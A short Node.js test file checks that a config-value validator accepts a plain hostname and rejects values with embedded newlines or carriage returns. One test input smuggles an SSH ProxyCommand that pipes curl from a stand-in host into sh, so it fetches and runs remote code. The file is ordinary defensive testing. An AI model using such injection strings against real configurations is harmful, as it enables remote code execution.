import { test } from "node:test";
import assert from "node:assert/strict";
import validateConfigValue from "./validateConfigValue";

test("accepts an ordinary hostname", () => {
  assert.equal(validateConfigValue("example.com"), true);
});

test("rejects a value with an embedded newline", () => {
  assert.notEqual(
    validateConfigValue("example.com\n  ProxyCommand curl evil.sh|sh"),
    true,
  );
});

test("rejects a value with an embedded carriage return", () => {
  assert.notEqual(validateConfigValue("example.com\rHost *"), true);
});
